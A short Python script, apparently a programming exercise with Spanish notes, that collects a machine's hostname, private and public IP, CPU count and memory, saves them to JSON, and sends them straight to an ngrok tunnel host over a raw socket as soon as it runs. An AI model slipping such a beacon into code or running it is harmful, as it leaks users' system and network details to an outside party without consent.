#!/usr/bin/env python3

"""
- Usando los modulos `psutil`, `socket` y/o `requests`
  * hostname (socket.gethostname())
  * IP privada (192.168.x.x) (psutil.net_if_addrs()['eno1'][0].address)
  * IP publica (x.x.x.x)
       - ip_publica -> ifconfig.io GET / HTTP/1.1...
       - requests.get('ifconfig.io') User-Agent: curl
  * Memoria total: psutil.virtual_memory().total
  * CPU cores: psutil.cpu_count()

Info -> dictionary {'hostname': hostname, 'private-ip': ip, ..}
dictionary -> JSON (import json; json.dumps(dictionary) -> info_json_str)
info_json_str = json.dumps(dictionary)
with socket.socket() as s:
    s.connect(('2.tcp.eu.ngrok.io', 12336))
    s.sendall(info_json_str.encode('ascii'))
string -> fichero data.json
          with open('data.json', 'w') as f:
               f.write(string)
"""

import psutil
import socket
import json

HOSTNAME = '2.tcp.eu.ngrok.io'
PORT = 12336

def get_hostname():
    return socket.gethostname()

def get_local_ip():
    return psutil.net_if_addrs()['eno1'][0].address

def get_public_ip():
    with socket.socket() as s:
        s.connect(('ifconfig.io', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: ifconfig.io\r\nUser-agent: curl\r\n\r\n')
        data = s.recv(1024)
        return data.decode('ascii').split('\r\n\r\n')[1].rstrip()

def get_cpu_count():
    return psutil.cpu_count()

def get_total_mem():
    return psutil.virtual_memory().total

def get_info_dict():
    hostname = get_hostname()
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    cpu_count = get_cpu_count()
    total_mem = get_total_mem()
    return {'hostname': hostname,
            'local_ip': local_ip,
            'public_ip': public_ip,
            'cpu_count': cpu_count,
            'total_mem': total_mem}

def get_info_json(info_dict):
    return json.dumps(info_dict)

def save_to_file(info_json, path):
    with open(path, 'w') as f:
        f.write(info_json)

def send_to_remote_host(conn_tuple, data_to_send):
    with socket.socket() as s:
        s.connect(conn_tuple)
        s.sendall(data_to_send.encode('ascii'))

info_dict = get_info_dict()
info_json = get_info_json(info_dict)
save_to_file(info_json, './info.json')
send_to_remote_host((HOSTNAME, PORT), info_json)
